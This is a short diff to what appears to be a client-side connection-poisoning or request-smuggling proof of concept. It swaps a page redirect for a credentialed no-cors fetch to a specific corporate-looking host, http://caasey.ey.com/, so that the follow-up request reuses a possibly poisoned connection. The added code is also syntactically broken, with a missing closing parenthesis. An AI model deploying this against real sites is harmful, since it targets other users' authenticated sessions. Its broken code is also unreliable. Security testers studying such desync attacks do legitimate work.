@@ -28,7 +28,11 @@
         credentials: "include"
       }).then(() => {
         // Reuse the same connection — if poisoned, this request will be affected
-        location.href = "http://caasey.ey.com/";
+        return fetch("http://caasey.ey.com/",{
+          method: 'GET',
+          mode: 'no-cors',
+          credentials: 'include'
+        };
       });
     }
   </script>
